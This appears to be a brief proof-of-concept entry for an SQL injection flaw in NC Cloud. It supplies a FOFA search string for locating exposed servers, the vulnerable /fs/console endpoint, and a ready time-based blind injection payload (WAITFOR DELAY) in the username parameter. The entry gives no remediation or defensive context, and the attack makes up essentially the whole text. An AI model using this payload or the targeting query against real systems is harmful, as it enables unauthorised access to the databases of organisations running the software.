<languages />

Affected Versions
-----------------

NC Cloud

FOFA
----

    "NCCloud"

Vulnerability location
----------------------

⚠️️Username can be injected.

    /fs/console?username=admin&password=123456

Payload
-------

    /fs/console?username=admin';WAITFOR DELAY '0:0:5' --&password=123456